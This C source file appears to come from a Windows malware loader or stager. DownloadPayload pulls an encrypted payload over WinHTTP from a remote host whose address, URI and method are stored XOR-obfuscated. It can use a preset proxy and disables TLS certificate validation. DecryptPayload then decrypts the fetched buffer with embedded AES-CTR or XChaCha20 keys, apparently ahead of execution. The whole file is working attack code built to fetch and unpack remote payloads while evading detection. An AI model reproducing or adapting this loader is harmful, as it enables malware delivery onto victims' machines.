#include <Ldr.h>
#include <Config.h>
#include <core/Payload.h>
#include <common/Macros.h>
#include <core/MiniStd.h>
#include <core/Memory.h>
#include <crypt/AesCrypt.h>
#include <crypt/XChaCha20Crypt.h>
#include <crypt/XorCrypt.h>
#include <exec/Execute.h>
#include <core/Win32.h>
#include <common/Defines.h>

#include <common/Debug.h>


BOOL
DownloadPayload(
    OUT PBUFFER PayloadBuffer
) {
    BOOL   Successful	  = { 0 };
    PVOID  Session		  = { 0 };
    PVOID  Connect		  = { 0 };
    PVOID  Request		  = { 0 };
    PWSTR  HttpHeader	  = { 0 };
    PWSTR  HttpEndpoint   = { 0 };
    DWORD  HttpFlags	  = { 0 };
    PCWSTR HttpProxy	  = { 0 };
    DWORD  BufRead		  = { 0 };
    UCHAR  Buffer[ 4096 ] = { 0 };
    PVOID  DataBuffer	  = { 0 };
    SIZE_T DataSize		  = { 0 };

    BOOL   Secure    = DOWNLOAD_HTTPS;
    BYTE   Host[]    = DOWNLOAD_HOST;
    DWORD  Port      = DOWNLOAD_PORT;
    BYTE   Uri[]     = DOWNLOAD_URI;
    BYTE   Method[]  = DOWNLOAD_METHOD;
    BYTE   UserAgent = { 0 };
    PBYTE  Headers[] = { 0 };


    xor_strcrypt( &Host,   sizeof( Host   ) );
    xor_strcrypt( &Uri,    sizeof( Uri    ) );
    xor_strcrypt( &Method, sizeof( Method ) );

#if ( defined( USE_PROXY ) && ( USE_PROXY == TRUE ) )
    BYTE  ProxyUrl[]    = DOWNLOAD_PROXY;
    PWSTR ProxyUsername = { 0 };
    PWSTR ProxyPassword = { 0 };
    
    WINHTTP_PROXY_INFO ProxyInfo = { 0 };
    
    xor_wstrcrypt( &ProxyUrl, sizeof( ProxyUrl ) );

    HttpProxy = ProxyUrl;

    // Preconfigured Proxy
    Session = Instance->WinHttp.WinHttpOpen( UserAgent, WINHTTP_ACCESS_TYPE_NAMED_PROXY, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
#else
    Session = Instance->WinHttp.WinHttpOpen( UserAgent, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
#endif // USE_PROXY == TRUE

    if ( ! Session ) {
        PRINTF( "[-] WinHttpOpen failed. Error: %d", NtGetLastError() )
        Successful = FALSE;
        goto CLEANUP_AND_LEAVE;
    }

    PRINTF( "[i] WinHttpConnect( %p, %ls, %d, 0 )", Session, Host, Port );
    if ( ! ( Connect = Instance->WinHttp.WinHttpConnect( 
        Session, 
        Host, 
        Port, 
        0 
    ) )	) {
        PRINTF( "[-] WinHttpConnect failed. Error: %d", NtGetLastError() )
        Successful = FALSE;
        goto CLEANUP_AND_LEAVE;
    }

    HttpEndpoint = Uri;
    HttpFlags = WINHTTP_FLAG_BYPASS_PROXY_CACHE;

    if ( Secure ) {
        HttpFlags |= WINHTTP_FLAG_SECURE;
    }

    PRINTF( "[i] WinHttpOpenRequest( %p, %ls, %ls, NULL, WINHTTP_NO_REFERER, NULL, %x )", Connect, Method, HttpEndpoint, HttpFlags );
    if ( ! ( Request = Instance->WinHttp.WinHttpOpenRequest( 
        Connect, 
        Method, 
        HttpEndpoint, 
        NULL, 
        NULL, 
        NULL, 
        HttpFlags 
    ) ) ) {
        PRINTF( "[-] WinHttpOpenRequest failed. Error: %d", NtGetLastError() );
        Successful = FALSE;
        goto CLEANUP_AND_LEAVE;
    }

    if ( Secure ) {
        HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA	       |
                    SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                    SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                    SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE  ;

        if ( ! Instance->WinHttp.WinHttpSetOption( 
            Request, 
            WINHTTP_OPTION_SECURITY_FLAGS, 
            & HttpFlags, 
            sizeof( DWORD )
        ) ) {
            PRINTF( "[-] WinHttpSetOption failed. Error: %d", NtGetLastError() )
        }
    }

#if ( defined( USE_PROXY ) && ( USE_PROXY == TRUE) )
    // preconfigured proxy
    ProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
    ProxyInfo.lpszProxy	   = ProxyUrl;

    if ( ! Instance->WinHttp.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, & ProxyInfo, sizeof( WINHTTP_PROXY_INFO ) ) ) {
            PRINTF( "[-] WinHttpSetOption failed to set ProxyInfo. Error: %d", NtGetLastError() )
    }

    if ( ProxyUsername ) {
        if ( ! Instance->WinHttp.WinHttpSetOption(
            Request,
            WINHTTP_OPTION_PROXY_USERNAME,
            ProxyUsername,
            StringLengthW( ProxyUsername )
        ) ) {
            PRINTF( "[-] WinHttpSetOption failed to set ProxyUsername. Error: %d", NtGetLastError() )
        }
    }

    if ( ProxyPassword ) {
        if ( ! Instance->WinHttp.WinHttpSetOption(
            Request,
            WINHTTP_OPTION_PROXY_PASSWORD,
            ProxyPassword,
            StringLengthW( ProxyPassword )
        ) ) {
            PRINTF( "[-] WinHttpSetOption failed to set ProxyPassword. Error: %d", NtGetLastError() )
        }
    }
#endif // DOWNLOAD_PROXY != FALSE

    PRINTF( "[i] WinHttpSendRequest( %p, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0 )", Request );
    if ( Instance->WinHttp.WinHttpSendRequest( Request, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0 ) ) {
        if ( Instance->WinHttp.WinHttpReceiveResponse( Request, NULL ) ) {
            if ( HttpQueryStatus( Request ) != HTTP_STATUS_OK ) {
                PUTS( "HttpQueryStatus is not HTTP_STATUS_OK (200)" )
                Successful = FALSE;
                goto CLEANUP_AND_LEAVE;
            }

            do {
                Successful = Instance->WinHttp.WinHttpReadData( Request, Buffer, sizeof( Buffer ), & BufRead );
                if ( ! Successful || BufRead == 0 ) {
                    break;
                }

                if ( ! DataBuffer ) {
                    DataBuffer = MmHeapAlloc( BufRead );
                } else {
                    DataBuffer = MmHeapReAlloc( DataBuffer, DataSize + BufRead );
                }

                DataSize += BufRead;

                CopyMemoryEx( ( PBYTE ) DataBuffer + ( DataSize - BufRead ), Buffer, BufRead );
                RtlSecureZeroMemory( Buffer, sizeof( Buffer ) );
            } while ( Successful == TRUE );

            PayloadBuffer->Length = DataSize;
            PayloadBuffer->Buffer = DataBuffer;

            Successful = TRUE;
        } else {
            PRINTF( "[-] WinHttpReceiveResponse failed. Error: %d", NtGetLastError() )
            Successful = FALSE;
            goto CLEANUP_AND_LEAVE;
        }
    } else {
        PRINTF( "[-] WinHttpSendRequest failed. Error: %d", NtGetLastError() )
        if ( NtGetLastError() == ERROR_WINHTTP_SECURE_FAILURE ) { PUTS( "[-] ERROR_WINHTTP_SECURE_FAILURE" ) }
        if ( NtGetLastError() == ERROR_WINHTTP_CANNOT_CONNECT ) { PUTS( "[-] ERROR_WINHTTP_CANNOT_CONNECT" ) }
        Successful = FALSE;
        goto CLEANUP_AND_LEAVE;
    }

CLEANUP_AND_LEAVE:
    if ( Request ) { Instance->WinHttp.WinHttpCloseHandle( Request ); }
    if ( Connect ) { Instance->WinHttp.WinHttpCloseHandle( Connect ); }
    if ( Session ) { Instance->WinHttp.WinHttpCloseHandle( Session ); }

    return Successful;
}


DWORD
HttpQueryStatus(
    _In_ PVOID Request
) {
    DWORD StatusCode = 0;
    DWORD StatusSize = sizeof( DWORD );

    if ( Instance->WinHttp.WinHttpQueryHeaders(
        Request,
        WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
        WINHTTP_HEADER_NAME_BY_INDEX,
        & StatusCode,
        & StatusSize,
        WINHTTP_NO_HEADER_INDEX
    ) ) {
        return StatusCode;
    }

    return 0;
}


VOID
DecryptPayload(
    IN OUT PBUFFER PayloadBuffer
) {
#if ( defined( AES ) && ( AES == TRUE ) )

    AESCTX AesCtx              = { 0 };
    UINT8  AesKey[AES_KEYLEN]  = AES_KEY;
    UINT8  AesIV[AES_BLOCKLEN] = AES_IV;

    AesInitCtx( &AesCtx, &AesKey, &AesIV );
    AesCtrXCryptBuffer( &AesCtx, PayloadBuffer->Buffer, PayloadBuffer->Length );

#elif ( defined( XChaCha20 ) && ( XChaCha20 == TRUE ) )

    XCHACHA20CTX XChaCha20Ctx         = { 0 };
    UINT8        XChaCha20Key[ 32 ]   = XCHACHA20_KEY;
    UINT8        XChaCha20Nonce[ 24 ] = XCHACHA20_NONCE;
    PVOID        TmpBuffer            = { 0 };

    TmpBuffer = MmHeapAlloc( PayloadBuffer->Length );

    xchacha_keysetup( &XChaCha20Ctx, &XChaCha20Key, &XChaCha20Nonce );
    xchacha_decrypt_bytes( &XChaCha20Ctx, PayloadBuffer->Buffer, TmpBuffer, PayloadBuffer->Length );

    MmHeapFree( PayloadBuffer->Buffer );
    PayloadBuffer->Buffer = TmpBuffer;
    TmpBuffer = NULL;

#endif
}